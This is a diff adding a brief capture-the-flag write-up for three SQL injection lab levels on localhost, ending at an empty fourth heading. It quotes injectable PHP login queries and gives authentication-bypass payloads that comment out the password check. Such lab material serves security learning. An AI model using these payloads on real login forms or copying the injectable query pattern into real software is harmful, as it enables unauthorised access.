@@ -1,1 +1,44 @@
+    [LEVEL 1]-TARGET: http://localhost:24001/index.php
 
+      - Focus on index.php:
+     
+      $sql = "SELECT username FROM users WHERE username='$post_username' AND password='$post_password'";
+      
+      => We will focus on this line to inject.
+
+      - This is the most basic in SQL injection that we will use this payload: "   admin'#    "    with username.
+
+      => After that, we get:  $sql = "SELECT username FROM users WHERE username='admin'#' AND password='$post_password'";
+      => After # will be comment and it only remain "SELECT username FROM users WHERE username='admin'"
+
+      => BOOM: "Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about THIS LEVEL!"
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    [LEVEL 2]-TARGET: http://localhost:24001/level2.php
+
+      - There is a bit different here:
+
+        $sql = "SELECT username FROM users WHERE username=\"$post_username\" AND password=\"$post_password\""
+
+      => They just add some "\" to avoid query error.
+      - To inject that, use this payload for username: admin"#
+      => The code will be: SELECT username FROM users WHERE username=\"admin"#\" AND password=\"$post_password\"
+
+      => Successful => Got the flag.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+     [LEVEL 3]-TARGET: http://localhost:24001/level3.php
+
+      - we got this: $sql = "SELECT username FROM users WHERE username=LOWER('$post_username') AND password=LOWER('$post_password')";
+
+      => Do it like level 1.
+      - use this for username: admin')#
+      
+      => $sql = "SELECT username FROM users WHERE username=LOWER('admin')#') AND password=LOWER('$post_password')"; 
+      => BOOM => flag.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    [LEVEL 4]-TARGET: http://localhost:24001/level4.php
